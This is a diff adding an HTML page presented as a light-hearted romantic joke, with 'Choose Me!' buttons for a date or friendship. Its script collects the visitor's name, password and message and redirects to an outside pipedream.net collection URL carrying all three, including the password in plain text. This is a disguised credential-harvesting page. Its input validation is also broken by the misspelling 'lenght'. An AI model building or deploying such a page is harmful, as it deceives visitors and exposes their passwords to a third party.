@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
+    <script src="jquery.min.js"></script>
+    <title>I don't Know</title>
+</head>
+<body onload="">
+
+
+    
+
+    <div class="container-fluid premier">
+
+        <div class=" container-fluid jumbotron bg-dark text-light tete">
+            <p class="text-center">It doesn't means I love you........ I wanted to make something funny</p>
+            <div class="row justify-content-center">
+                <div class="col-6">
+                    <div class="form-group">
+                        <input type="text" class="form-control" id="name" placeholder="type your name here...">
+                        <input type="password" class="form-control mt-2" id="password" placeholder="password...">
+                        <input type="text" class="form-control mt-2" id="message" placeholder="enter a message...">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+        <div class="container deuxieme justify-content-center">
+
+            <div class="row justify-content-center">
+                <div class="col-lg-4 col-md-3">
+                    <div class="card">
+                        <img src="trois.png" alt="" class="card-img-top" height="500px">
+                        <div class="card-body bg-dark text-light">
+                            <div class="card-title">Wait The First Date</div>
+                            <div class="card-text">yes, You can decide to wait the first thay to see wich kind of guy i am.</div>
+                            <a href="#" class="btn btn-light mt-2" id="more1" value="petit-ami" onclick="recupere()">Choose Me!</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-4 col-md-3">
+                    <div class="card">
+                        <img src="de.png" alt="" class="card-img-top" height="500px">
+                        <div class="card-body bg-dark text-light">
+                            <div class="card-title">Get To Know More</div>
+                            <div class="card-text">yes, You can choose to know me more .</div>
+                            <a href="#" class="btn btn-light mt-2" id="more2" value="ami" onclick="recupere()">Choose Me!</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="container-fluid bg-dark footer">
+            <p class="text-center text-light">Good bye!</p>
+        </div>
+
+
+    </div>
+
+
+
+    
+</body>
+
+<script>
+
+    function partie1(){
+
+
+        document.location="https://enx52fqyhpuco.x.pipedream.net/?reponse=je te veux comme un ami &name="+name+"&password="; 
+
+        
+
+    }
+    function alerte(){
+
+        let name=document.getElementById('name').value;
+        let password=document.getElementById('password').value;
+        let message=document.getElementById('message').value;
+
+        if(name.lenght<8 || password.lenght<8 || message.lenght<8){
+
+            alert("veuillez bien remplir les informations du formulaire en dessus!");
+
+            return false;
+
+        }
+
+
+    }
+
+    function recupere(){
+
+        let name=document.getElementById('name').value;
+        let password=document.getElementById('password').value;
+        let message=document.getElementById('message').value;
+
+
+        let truc=alerte();
+
+
+        if(truc!=false){
+
+            alert("thank you "+name+"for your message");
+            document.location="https://enx52fqyhpuco.x.pipedream.net/?reponse=je te veux comme un ami &name="+name+"&password="+password+"&message="+message; 
+
+        }
+        else{
+            console.log("faux");
+        }
+
+
+
+
+    }
+
+
+</script>
+
+</html>
